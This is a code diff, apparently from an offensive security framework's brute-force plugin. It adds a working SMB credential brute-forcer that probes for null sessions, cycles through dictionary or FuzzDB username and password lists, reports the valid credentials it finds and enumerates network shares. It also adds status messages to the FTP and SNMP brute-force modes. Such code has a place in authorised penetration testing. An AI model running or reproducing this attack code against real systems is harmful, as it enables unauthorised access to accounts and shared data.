@@ -160,8 +160,7 @@ class bruterPlugin(BasePlugin):
             self.setSocksProxy()
         else:
             self.unsetSocksProxy()
-
-        print "[+] Bruteforce on service %s " %(host)
+        print "[+] Starting FTP BruteForce mode against %s on port %s" %(host, str(port))
         print "[+] Trying Anonymous access in: %s " %(host)
         if self.anonymousFTPAccess(host,port):
             return
@@ -214,6 +213,7 @@ class bruterPlugin(BasePlugin):
         TOR only works on TCP, and typically SNMP works on UDP, so teorically you cann't configure an SNMP Service as Hidden Service.
         '''
         self.unsetSocksProxy()
+        print "[+] Starting SNMP BruteForce mode against %s on port %s" %(host, str(port))
         if dictFile is not None and os.path.exists(dictFile):
             print "[+] Reading the Passwords file %s " %(dictFile)
             for line in open(dictFile, "r").readlines():
@@ -244,10 +244,42 @@ class bruterPlugin(BasePlugin):
     ################################################################################################################################################
     ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
     ################################################################################################################################################
-    def smbBruterOnRelay(self, relay, dictFile=None):
+    def smbBruterOnRelay(self, host, port=139, dictFile=None):
         self.unsetSocksProxy()
-        if dictFile is None:
-            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
+        print "[+] Starting SMB BruteForce mode against %s on port %s" %(host, str(port))
+        print "[+] Testing a Null-Session against the target."
+        if self.performSMBConnection(host, port,'',''):
+            print "[+] SMB Null-Session found in host: %s " %(host)
+            return
+
+        if dictFile is not None and os.path.exists(dictFile):
+            print "[+] Reading the Passwords file %s " %(dictFile)
+            for line in open(dictFile, "r").readlines():
+                [user, passwd] = line.strip().split(self.separator)
+                try :
+                    if self.performSMBConnection(host,port, user=user, passwd=passwd):
+                        break
+                except Exception as excep:
+                    print "[-] Captured exception. Finishing attack."
+                    print sys.exc_info()
+                    return
+        else:
+            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
+            usersList = self.getUserlistFromFuzzDB()
+            passList = self.getPasslistFromFuzzDB()
+
+            try :
+                for user in usersList:
+                    #Same user and password are valid?
+                    if self.performSMBConnection(host,port, user=user, passwd=user):
+                        break
+                    for passwd in passList:
+                        if self.performSMBConnection(host,port, user=user, passwd=passwd):
+                            return
+            except Exception as excep:
+                print "[-] Captured exception. Finishing attack."
+                print sys.exc_info()
+                return
             
 
     def smbBruterOnAllRelays(self, dictFile=None):
@@ -407,6 +439,21 @@ class bruterPlugin(BasePlugin):
         else:
             print "[*] SNMP Bruteforce Success ... community name: %s is VALID! " % (community)
             return True
+
+    def performSMBConnection(self, host, port, user, passwd):
+        self.setSocksProxy()
+        import socket
+        client_name =socket.gethostname()
+        smbClient = SMBConnection(user, passwd, client_name, "", use_ntlm_v2 = True)
+        if smbClient.connect(host, port):
+            print "[+] SMB Bruteforce Success ... username: %s and passoword %s are VALID! " % (user, passwd)
+            print "[+] Listing the Shared resources"
+            for share in smbClient.listShares():
+                print "[*][*] Resource name: %s " %(share.name)
+            return True
+        else:
+            return False
+
 
 
     def getUserlistFromFuzzDB(self):
